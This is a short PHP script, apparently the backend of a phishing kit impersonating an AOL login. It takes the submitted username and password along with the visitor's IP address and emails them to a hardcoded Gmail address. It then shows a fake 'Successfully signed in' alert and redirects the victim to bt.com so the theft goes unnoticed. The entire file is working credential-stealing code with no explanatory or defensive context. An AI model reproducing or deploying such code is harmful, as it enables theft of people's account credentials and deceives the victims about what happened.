<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Aol Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
mail($recipient,$subject,$message);

$recipient = "cooldjakib@gmail.com";
$subject = "Result!!!";
$headers = "From: aol <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>                    
	
		   <script language=javascript>
alert('Successfully signed in!!!');
window.location='https://www.bt.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>